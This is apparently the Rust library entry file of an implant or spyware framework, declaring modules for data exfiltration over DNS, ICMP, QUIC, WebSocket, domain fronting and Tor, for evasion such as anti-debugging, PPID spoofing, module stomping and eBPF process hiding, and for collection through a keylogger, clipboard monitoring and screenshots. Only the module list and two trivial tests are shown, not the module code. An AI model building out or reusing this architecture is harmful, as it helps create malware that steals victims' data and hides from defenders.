// Library entry point for shared library builds
pub mod constants;
pub mod hook;
#[cfg(target_os = "linux")]
pub mod hook_lib; // LD_PRELOAD hook library (separate cdylib)
pub mod exfil;
pub mod crypto;
pub mod buffer;
pub mod advanced_evasion;
pub mod quantum_obfuscation;
pub mod error_handling;
pub mod logging;
pub mod obfuscate;
pub mod config;
pub mod injection;
pub mod proto;
#[cfg(target_os = "linux")]
pub mod ipc; // Memory-only IPC (Abstract sockets, memfd)
#[cfg(feature = "ebpf")]
pub mod ebpf_hooks; // eBPF kernel-level hooking
#[cfg(feature = "ai-filtering")]
pub mod ai_filtering; // AI-driven data filtering
#[cfg(feature = "post-quantum")]
pub mod pqc; // Post-quantum cryptography (Kyber/Dilithium)
pub mod multi_channel; // Multi-channel exfiltration (DNS, DoH, steganography)
#[cfg(target_os = "linux")]
pub mod tor_client; // Embedded Tor client (directory)
pub mod rate_limiter; // Rate limiting for exfiltration (anti-detection)

// New network exfiltration channels
pub mod domain_fronting; // Domain fronting via CDN
pub mod dns_tunnel; // DNS tunneling
pub mod icmp_tunnel; // ICMP tunneling
pub mod websocket_exfil; // WebSocket exfiltration
pub mod quic_exfil; // QUIC/HTTP3 exfiltration
pub mod adaptive_channel; // Multi-channel adaptive fallback

// Cryptographic enhancements
#[cfg(feature = "forward-secrecy")]
pub mod forward_secrecy; // Signal Protocol / Double Ratchet

// Performance optimizations
pub mod ring_buffer_opt; // Optimized ring buffer with wait/notify
pub mod compression_adaptive; // Adaptive compression selection
pub mod lazy_filtering; // Filter before encryption
pub mod batch_processing; // Batch processing and queuing

// Security and evasion
pub mod anti_debug; // Anti-debugging and anti-VM detection
pub mod cert_pinning; // Certificate pinning and TLS inspection detection
pub mod timing_randomization; // Human-like timing patterns
pub mod geofencing; // Geofencing and environmental checks
pub mod secure_memory; // Secure memory wiping
pub mod key_rotation; // Key rotation and expiration

// Operational improvements
pub mod self_healing; // Self-healing and automatic recovery
pub mod config_hot_reload; // Configuration hot-reload

// Detection resistance
pub mod traffic_padding; // Traffic padding and shaping
pub mod polymorphic_network; // Polymorphic network protocols
pub mod decoy_traffic; // Decoy traffic generation

// Advanced host-based evasion
pub mod indirect_syscalls; // Indirect syscalls beyond Hell's Gate
pub mod heavens_gate; // Heaven's Gate WoW64 bypass
pub mod ppid_spoofing; // PPID spoofing
pub mod call_stack_spoofing; // Call stack spoofing
pub mod module_stomping; // Module stomping / DLL hollowing
pub mod polymorphic_code; // Polymorphic code engine

// Kernel-level hooking
#[cfg(feature = "ebpf")]
pub mod kprobes_hooking; // kprobes kernel function hooking
#[cfg(feature = "ebpf")]
pub mod tracepoint_hooking; // Tracepoint-based hooking
pub mod plt_got_hijacking; // PLT/GOT hijacking for multiple binaries
#[cfg(feature = "ebpf")]
pub mod ebpf_process_hiding; // eBPF-based process hiding

// Operational improvements (continued)
pub mod intelligent_hooks; // Intelligent hook selection
pub mod error_logging; // Verbose error logging and diagnostics
pub mod multi_stage; // Multi-stage implant architecture

// Multi-platform consistency
pub mod unified_config; // Unified configuration format
pub mod build_system; // Cross-platform build system
pub mod platform_capabilities; // Platform capability detection

// Advanced intelligence collection
#[cfg(feature = "screenshot")]
pub mod screenshot_capture; // Screenshot capture module
#[cfg(feature = "keylogger")]
pub mod keylogger; // Keylogger module (high-risk)
pub mod clipboard_monitor; // Clipboard monitoring
pub mod database_interception; // Database query interception

// Re-export commonly used types
pub use crypto::CryptoManager;
pub use hook::HookManager;
pub use buffer::RingBuffer;
pub use logging::{Metrics, Logger};
pub use config::MissionConfig;
pub use error_handling::ProtosyteError;

#[cfg(test)]
mod tests {
    #[tokio::test]
    #[cfg(target_os = "linux")]
    async fn test_ipc_basic() {
        use crate::ipc::MemfdRingBuffer;
        let buffer = MemfdRingBuffer::new(1024);
        assert!(buffer.is_ok());
    }
    
    #[tokio::test]
    #[ignore]
    #[cfg(target_os = "linux")]
    async fn test_tor_client() {
        // Tor client test - requires tor_client module which may not be available
        // Test is ignored by default - requires Tor
    }
}
